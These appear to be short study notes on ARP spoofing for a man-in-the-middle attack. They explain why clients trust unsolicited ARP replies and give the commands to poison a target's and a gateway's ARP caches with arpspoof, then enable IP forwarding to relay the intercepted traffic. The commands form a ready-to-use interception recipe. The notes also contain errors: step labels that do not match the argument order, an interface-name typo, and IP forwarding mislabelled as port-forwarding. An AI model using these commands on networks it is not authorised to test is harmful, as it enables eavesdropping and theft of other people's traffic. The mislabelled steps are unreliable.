hacker intercepts arp requests between clients and server, monitoring the packets being exchanged
Man-in-the-middle

- clients accept responses even if they did not send a request
- clients trust repsonse without any form of verification

<p>1. Fool the router that you are the client</p>

```
arpspoof -i eth0 -t *target machine* *gateway/router*
```

<p>2. Fool the client that you are the router</p>

```
arpspoof -i etho0 -t *gateway/router* *target machine*
```

<p>3. Enable your machine to forward requests like a router <b>(port-forwarding)</b></p>

```
echo 1 > /proc/sys/net/ipv4/ip_forward
```
